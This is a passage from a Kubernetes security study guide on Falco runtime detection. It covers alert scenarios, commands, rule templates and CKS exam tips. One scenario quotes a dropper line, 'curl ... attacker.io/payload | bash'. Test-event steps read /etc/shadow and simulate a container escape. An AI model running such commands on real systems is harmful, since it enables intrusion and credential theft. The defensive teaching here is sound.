| Detection Coverage | Rules covering MITRE TTPs | > 80% of relevant TTPs |
| Alert-to-Ticket Rate | Tickets opened / Alerts | > 5% (low = missing real threats) |
| Mean Time to Detect (MTTD) | Alert time - Incident start | < 5 minutes |
| Mean Time to Respond (MTTR) | Response time - Alert time | < 30 minutes (CRITICAL) |

---

## 13. Real Present-Day Scenarios

### Scenario 1: Developer Accidentally Runs `kubectl` Inside Production Pod

A developer `exec`s into a production pod to debug an issue and accidentally runs `kubectl get secrets` from inside the container, exposing the service account token's access.

**Falco detection:**
```
Warning kubectl Executed Inside Container
(user=root container=api-server-7d8f9b image=company/api:2.3.1
 cmdline=kubectl get secrets pod=api-server-7d8f9b ns=production)
```

**Response:** Alert fires immediately. Security team sees the alert, confirms it's a developer, adds to the post-mortem that developers should not `exec` into production pods. Policy: require separate debugging namespace with read-only service account.

### Scenario 2: Zero-Day RCE in Web Application (Like Log4Shell)

A Java web application running in Kubernetes is exploited via a zero-day RCE. The attacker's first action after code execution is spawning `/bin/bash`.

**Falco detection (within milliseconds):**
```
Warning A shell was spawned in a container with an attached terminal
(user=nobody container=web-app-abc123 image=company/webapp:1.0.3
 shell=bash parent=java cmdline=bash -i pod=webapp-7f6b4 ns=production)
```

**Timeline:** CVE disclosed at T+0. Patch available at T+48h. Falco detected the attack at T+2h (initial exploitation). Without Falco, discovery would have been T+weeks.

### Scenario 3: Compromised CI/CD Pipeline Pushing Malicious Image

A malicious image with a built-in reverse shell is pushed to the registry and deployed. On startup, the container executes a curl command to download the second stage:

```bash
# What the malicious entrypoint does:
curl -s http://attacker.io/payload | bash
```

**Falco detection:**
```
Critical Outbound Connection from Shell Process
(user=root shell=sh container=app-deployment-xyz
 remote_ip=1.2.3.4 remote_port=4444 pod=app-7f8b9c ns=production)
```

**Lesson:** Admission-time scanning missed this because the malicious code was not in the image layers — it was downloaded at runtime. Only Falco caught it.

### Scenario 4: Insider Threat — SRE Extracting Data from Production Database Pod

An SRE with legitimate cluster access `exec`s into a database pod and runs `mysqldump` to extract customer data.

**Falco detects:**
- Shell spawned in database container (terminal shell rule)
- `mysqldump` execution (custom rule for database dump utilities)
- Large file write in `/tmp` (data staging)
- Outbound connection to personal cloud storage (network rule)

**Four separate Falco alerts** that, when correlated, tell a complete data exfiltration story. Without this, the incident would be discovered weeks later in a data breach notification.

---

## 14. What Happens If You Don't Follow This

### Without Custom Rules

The default Falco ruleset is excellent but it is intentionally generic. Without custom rules:

- **Cryptominers running non-standard binary names** (`p2pool`, `nbminer`, custom-compiled `xmrig` with renamed binary) won't be caught
- **Application-specific attacks** (exploiting your internal APIs, attacking your custom message queue) have no detection rules
- **Compliance-required detections** (PCI DSS: all database access must be logged) are not implemented

### Without Output Field Tuning

If your output fields don't include Kubernetes context:
```yaml
# BAD: useless in a multi-tenant cluster
output: "Sensitive file read (user=%user.name)"

# GOOD: actionable
output: "Sensitive file read (user=%user.name pod=%k8s.pod.name ns=%k8s.ns.name
         container=%container.name image=%container.image.repository cmdline=%proc.cmdline)"
```

The bad output tells you a file was read. The good output tells you which container in which namespace ran which command. The difference is 30 minutes of investigation time per alert.

### Without Rule Testing

Untested rules have two failure modes:
- **Too broad** → alert storms → responders learn to ignore Falco → missed real attacks
- **Too narrow** → rule never fires → false confidence that you're protected

The event-generator tool exists precisely to prevent this. Use it.

### Editing `falco_rules.yaml` Directly

```bash
# DO NOT DO THIS:
vi /etc/falco/falco_rules.yaml

# The next apt upgrade of Falco will:
apt upgrade falco
# → Overwrites falco_rules.yaml with the new default ruleset
# → Your custom rules are DELETED
# → You don't notice until an attack happens that should have been caught
```

Always use `falco_rules.local.yaml` or the `rules.d/` directory.

---

## 15. Most Common Commands and Syntax

### Verifying Falco

```bash
# Check service health
systemctl status falco

# Verify kernel probe is loaded
lsmod | grep falco_probe

# Check eBPF programs
bpftool prog list | grep falco

# Validate configuration
falco --validate /etc/falco/falco.yaml

# List all loaded rules
falco --list-rules
```

### Log Monitoring

```bash
# Real-time log streaming (primary command)
journalctl -fu falco

# Last N lines then follow
journalctl -fu falco -n 100

# Time-bounded log query
journalctl -u falco --since "1 hour ago"
journalctl -u falco --since "2024-05-16 12:00:00" --until "2024-05-16 13:00:00"

# Filter by priority
journalctl -u falco | grep -E "(Critical|Error|Warning)"

# JSON parsing (if json_output=true)
journalctl -u falco | jq 'select(.priority == "Critical")'
journalctl -u falco | jq 'select(.rule | contains("shell"))'

# DaemonSet log monitoring
kubectl logs -n falco <pod-name> -f
kubectl logs -n falco -l app.kubernetes.io/name=falco -f
```

### Generating Test Events

```bash
# Deploy test pod
kubectl run nginx --image=nginx

# Find which node it landed on
kubectl get pod nginx -o wide
kubectl get pod nginx -o jsonpath='{.spec.nodeName}'

# Trigger shell alert
kubectl exec -ti nginx -- bash

# Trigger sensitive file alert (inside container)
cat /etc/shadow

# Trigger write below binary dir
touch /bin/testfile

# Trigger container escape attempt simulation
nsenter --target 1 --mount --uts --ipc --net --pid -- ls /
```

### Rule Management

```bash
# Edit custom rules
nano /etc/falco/falco_rules.local.yaml
# or:
vi /etc/falco/falco_rules.local.yaml

# Validate rules file
falco -r /etc/falco/falco_rules.local.yaml --validate

# Reload rules without restart (Falco 0.28+)
kill -1 $(cat /var/run/falco.pid)

# Or via systemctl
systemctl reload falco
systemctl restart falco

# Check which rules file contains a specific rule
grep -r "Detect Shell" /etc/falco/

# List rules matching a filter
falco --list-rules | grep -i shell
```

### Complete Rule Template

```yaml
# Lists (reusable collections)
- list: my_list_name
  items: [item1, item2, item3]

# Macros (reusable conditions)
- macro: my_macro_name
  condition: <condition_expression>

# Rules
- rule: My Rule Name
  desc: What this rule detects and why it is suspicious
  condition: >
    container and
    proc.name in (my_list_name) and
    my_macro_name
  output: >
    Alert description
    (user=%user.name proc=%proc.name cmdline=%proc.cmdline
     container=%container.name image=%container.image.repository
     pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: WARNING
  tags:
    - container
    - mitre_<tactic>
    - T<technique_id>
```

---

## 16. Other Tools and Services Available

### 16.1 Falco Event Generator

The official test tool for validating Falco rules:

```bash
# Install
kubectl apply -f https://raw.githubusercontent.com/falcosecurity/event-generator/main/deployment/kubernetes/event-generator.yaml

# Run all syscall tests
event-generator run syscall

# Run specific test
event-generator run syscall.ReadSensitiveFileUntrusted

# List available tests
event-generator list
```

### 16.2 Falco Rule IDE Support

- **VS Code Extension**: Falco rules syntax highlighting and validation
- **Falco Playground**: Web-based rule editor at https://falco.org/playground
- **falcoctl**: CLI for managing Falco artifacts and rules from OCI registries

```bash
# Install falcoctl
curl -L https://github.com/falcosecurity/falcoctl/releases/latest/download/falcoctl_linux_amd64 \
  -o /usr/local/bin/falcoctl
chmod +x /usr/local/bin/falcoctl

# Search for rules
falcoctl artifact search shell

# Install latest community rules
falcoctl artifact install falco-rules
```

### 16.3 SIEM Integration Options

| SIEM | Integration | Method |
|---|---|---|
| Splunk | Falco → Falcosidekick → Splunk HEC | HTTP output |
| Elastic/Kibana | Falco → Filebeat → Elasticsearch | File output + Filebeat |
| Datadog | Falco → Falcosidekick → Datadog | HTTP output |
| IBM QRadar | Falco → syslog → QRadar | Syslog output |
| Azure Sentinel | Falco → Falcosidekick → Event Hub → Sentinel | HTTP + Azure |
| AWS Security Hub | Falco → Falcosidekick → SNS → Security Hub | HTTP + Lambda |

### 16.4 Automated Response with Falco Talon

```yaml
# falco-talon-rules.yaml
- action: Kill Pod
  match:
    rules:
      - Cryptocurrency Miner Detected
      - Reverse Shell Detected
  actions:
    - action: Kubernetes:Delete
      parameters:
        grace_period_seconds: 0
```

When Falco fires the `Cryptocurrency Miner Detected` rule, Talon automatically deletes the offending pod within seconds — no human intervention required.

---

## 17. How AI Is Impacting This Area

### 17.1 AI-Assisted Rule Generation

LLMs can generate Falco rules from natural-language threat descriptions, dramatically lowering the barrier to custom rule writing:

```
User: "Write a Falco rule to detect if a container downloads and executes 
       a script from the internet using curl piped to bash"

Claude generates:
- rule: Download and Execute Script
  desc: curl piped to bash — common dropper pattern
  condition: >
    container and
    spawned_process and
    proc.name in (bash, sh, dash) and
    proc.pname in (curl, wget) and
    proc.args contains "-"   # Reading from stdin
  output: >
    Script downloaded and executed
    (user=%user.name container=%container.name cmd=%proc.cmdline
     parent=%proc.pname pod=%k8s.pod.name)
  priority: CRITICAL
```

This capability allows teams without deep Falco expertise to build comprehensive rule sets by describing threats in plain language.

### 17.2 AI-Powered Alert Correlation

Individual Falco alerts are atomic — they describe one event. But attacks are sequences of events. AI systems can correlate:

```
T+0s:  Container read /etc/passwd (Falco: sensitive file read)
T+2s:  Container executed nmap (Falco: network scanner)
T+5s:  Container connected to external IP (Falco: outbound connection)
T+8s:  Container wrote to /tmp (Falco: temp dir write)

AI Correlation: "These 4 alerts form an attack chain: 
                 Reconnaissance → Network Scanning → C2 Connection → 
                 Staging. High confidence this is an active intrusion."
```

Without AI correlation, these would be four separate low-priority alerts. With AI, it becomes a single HIGH PRIORITY incident.

### 17.3 Continuous Rule Quality Improvement

AI systems can analyze rule performance over time:
- Rules that never fire → dead rules (either the threat doesn't exist or the rule is broken)
- Rules with >80% false positives → need tuning
- Gaps in MITRE ATT&CK coverage → suggest new rules

This produces a self-improving rule set that gets better over time without manual intervention.

### 17.4 Natural Language Alert Explanations

Raw Falco alerts are terse and require expertise to interpret. AI translates them:

```
Raw alert:
"Warning Sensitive file opened for reading by non-trusted program
(user=root program=python3 file=/etc/shadow container=api-server-7d8f9b)"

AI explanation:
"A Python script running as root just read /etc/shadow — the file that 
stores encrypted user passwords. This is unusual for an API server 
container. It could mean:
1. The container is being used to crack passwords (attacker tool)
2. A configuration error is running privileged maintenance scripts in prod
3. A legitimate process that hasn't been whitelisted yet

Recommended action: Check if this Python process is part of the expected 
application code. If not, isolate the pod immediately."
```

---

## 18. CKS Exam Tips

The CKS exam tests your practical ability to use Falco for threat detection. This chapter covers the most directly tested competencies.

### What the Exam Tests

| Competency | Exam Frequency |
|---|---|
| Reading Falco alert output and identifying the triggered rule | Very High |
| Understanding the 5 mandatory rule keys | Very High |
| Understanding what `condition`, `output`, `priority` do | High |
| Using `journalctl -fu falco` to monitor alerts | High |
| `kubectl exec` into a container to trigger alerts | High |
| Understanding macros (`container` macro) | High |
| Writing a simple custom rule | Medium |

### The Four-Step Exam Workflow

When asked to "detect" something with Falco:

```bash
# 1. Verify Falco is running
systemctl status falco

# 2. Open a monitoring terminal
journalctl -fu falco

# 3. Generate the event (in another terminal)
kubectl exec -ti <pod> -- bash
# or: cat /etc/shadow (inside container)

# 4. Read and interpret the alert that appears
```

### Exam-Critical Rule Syntax (Memorise This)

```yaml
- rule: Detect Shell inside a container
  desc: Alert if a shell such as bash is open inside a container
  condition: container and proc.name in (linux_shells)
  output: Bash Opened (user=%user.name container=%container.id)
  priority: WARNING

- list: linux_shells
  items: [bash, zsh, ksh, sh, csh]

- macro: container
  condition: container.id != host
```

Know this cold. The exam may ask you to:
- Identify which key is the filtering expression (`condition`)
- Identify what `container.id != host` means
- Explain what `proc.name in (linux_shells)` checks
- Write a similar rule for a different threat

### Common Exam Traps

**Trap 1: Monitoring the wrong node's Falco log**

```bash
# Pod is on node01 but you're watching node02's logs
kubectl get pod nginx -o wide  # Check the NODE column first!
# Then SSH to that node and run journalctl -fu falco
```

**Trap 2: Forgetting `-f` in journalctl (not following in real time)**

```bash
# WRONG: Shows past logs but doesn't stream new ones
journalctl -u falco

# RIGHT: Streams new alerts as they occur
journalctl -fu falco
```

**Trap 3: Editing the wrong rules file**

```bash
# WRONG: Will be overwritten on Falco upgrade
vi /etc/falco/falco_rules.yaml

# RIGHT: Safe for custom rules
vi /etc/falco/falco_rules.local.yaml
```

**Trap 4: Forgetting to reload after rule changes**

```bash
# After editing falco_rules.local.yaml, always restart:
systemctl restart falco
# Or reload (less disruptive):
kill -1 $(cat /var/run/falco.pid)
```

**Trap 5: Wrong output format for field references**

```yaml
# WRONG syntax:
output: "User: {user.name}"

# RIGHT syntax — use % prefix:
output: "User: %user.name"
```

### Quick-Reference: Key Falco Field Names

| What you want | Field |
|---|---|
| Process name | `proc.name` |
| Full command line | `proc.cmdline` |
| Parent process name | `proc.pname` |
| File path | `fd.name` |
| Container ID | `container.id` |
| Container name | `container.name` |
| Container image | `container.image.repository` |
| Pod name | `k8s.pod.name` |
| Namespace | `k8s.ns.name` |
| Username | `user.name` |
| User UID | `user.uid` |
| Remote IP | `fd.rip` |
| Remote port | `fd.rport` |

---

## 19. Links and References

- [Falco Rules Documentation](https://falco.org/docs/rules/)
- [Falco Supported Fields Reference](https://falco.org/docs/reference/rules/supported-fields/)
- [Falco Default Rules Source](https://github.com/falcosecurity/rules/blob/main/rules/falco_rules.yaml)
- [Falco Condition Language Reference](https://falco.org/docs/rules/conditions/)
- [Falco Event Generator](https://github.com/falcosecurity/event-generator)
- [Falco Talon — Automated Response](https://github.com/falco-talon/falco-talon)
- [MITRE ATT&CK — Container Matrix](https://attack.mitre.org/matrices/enterprise/containers/)
- [Falco Playground](https://falco.org/playground/)
- [falcoctl — Falco Artifact Management](https://github.com/falcosecurity/falcoctl)
- [Falco Community Rules](https://github.com/falcosecurity/rules)

---

*Chapter 3 of 6 — Monitoring, Logging and Runtime Security*
*Next: Chapter 4 — Falco Configuration Files*
